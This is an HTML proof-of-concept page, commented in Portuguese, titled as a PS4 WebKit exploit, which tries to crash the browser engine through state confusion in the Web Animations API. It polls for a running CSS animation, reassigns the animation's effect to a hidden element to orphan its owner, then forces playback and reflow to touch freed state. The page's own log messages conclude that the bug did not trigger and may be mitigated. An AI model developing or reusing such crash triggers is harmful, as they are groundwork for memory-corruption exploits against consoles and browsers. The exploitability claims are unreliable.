<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Exploit V6 (Polling)</title>
    <style>
        body { background-color: #222; color: #fff; font-family: sans-serif; text-align: center; }
        #log { margin-top: 10px; text-align: left; background: #000; padding: 10px; border: 1px solid #444; white-space: pre-wrap; font-size: 14px; min-height: 100px;}
        
        /* SUPORTE TOTAL A WEBKIT ANTIGO */
        @-webkit-keyframes keyframes { 
            0% { opacity: 0.1; -webkit-transform: scale(1); } 
            100% { opacity: 1; -webkit-transform: scale(1.1); } 
        }
        @keyframes keyframes { 
            0% { opacity: 0.1; transform: scale(1); } 
            100% { opacity: 1; transform: scale(1.1); } 
        }
        
        .target-anim {
            -webkit-animation-name: keyframes;
            animation-name: keyframes;
            
            -webkit-animation-duration: 500ms;
            animation-duration: 500ms;
            
            -webkit-animation-iteration-count: infinite;
            animation-iteration-count: infinite;
            
            display: block;
            width: 100px; height: 50px; background: #d00; 
            margin: 10px auto;
            color: white; font-weight: bold; line-height: 50px;
        }
    </style>
</head>
<body>
    <h3>WebKit V6: Loop & Prefixes</h3>
    <button onclick="startPolling()">FORÇAR INÍCIO</button>
    <div id="log">Aguardando...</div>

    <div id="container">
        <object data="falha_proposital.png" type="image/png" id="obj">
            <cite id="cite">ALVO</cite>
            <dl hidden id="dl"></dl>
        </object>
    </div>

    <script>
        const logArea = document.getElementById('log');
        const cite = document.getElementById('cite');
        const obj = document.getElementById('obj');
        const dl = document.getElementById('dl');
        let timer = null;
        let attemptCount = 0;

        function log(msg) {
            logArea.innerText = `[${attemptCount}] ${msg}\n` + logArea.innerText;
        }

        // ============================================
        // PAYLOAD DO CRASH
        // ============================================
        function executeCrash(animation) {
            clearInterval(timer); // Para o loop
            log("!!! ANIMAÇÃO ENCONTRADA !!!");
            log(">> Executando Payload de State Confusion...");

            try {
                // 1. Sujar propriedades
                obj.width = "10px";
                let trash = obj.codeBase; 

                // 2. O Ataque (CVE-2025-XXXX)
                // Remove o owningElement
                animation.effect = new KeyframeEffect(dl, { });

                // 3. Forçar uso imediato do ponteiro nulo
                log(">> Tentando acessar propriedades da animação órfã...");
                
                // Tenta alterar playbackRate (força sync)
                animation.playbackRate = 0.5;
                
                // Tenta forçar reflow no elemento original
                cite.style.opacity = "0.5";
                void cite.offsetWidth;

                log("FALHA: O navegador não crashou. Código executado sem erros fatais.");
                log("CONCLUSÃO: O bug não é explorável ou foi mitigado.");
            } catch (e) {
                log("ERRO JS INESPERADO: " + e.message);
            }
        }

        // ============================================
        // LOOP DE BUSCA (POLLING)
        // ============================================
        function checkAnimation() {
            attemptCount++;
            
            // Tenta forçar o navegador a desenhar o frame
            void cite.offsetWidth;

            // Busca animações usando web animations API
            let anims = [];
            if (cite.getAnimations) {
                anims = cite.getAnimations();
            } else if (document.getAnimations) {
                anims = document.getAnimations(); // Fallback global
            }

            if (anims.length > 0) {
                executeCrash(anims[0]);
            } else {
                if (attemptCount % 10 === 0) {
                    log("Procurando animação na memória...");
                }
                
                // Se demorar muito, tenta reiniciar a classe CSS
                if (attemptCount === 50) {
                    log("Tentando reiniciar CSS...");
                    cite.classList.remove("target-anim");
                    void cite.offsetWidth; // Force Reflow
                    cite.classList.add("target-anim");
                }
            }
        }

        function startPolling() {
            if (timer) clearInterval(timer);
            
            log("Iniciando Loop de Polling (50ms)...");
            
            // Adiciona a classe que tem as animações com prefixos -webkit-
            cite.classList.add("target-anim");
            
            // Inicia o loop
            timer = setInterval(checkAnimation, 50);
        }
    </script>
</body>
</html>
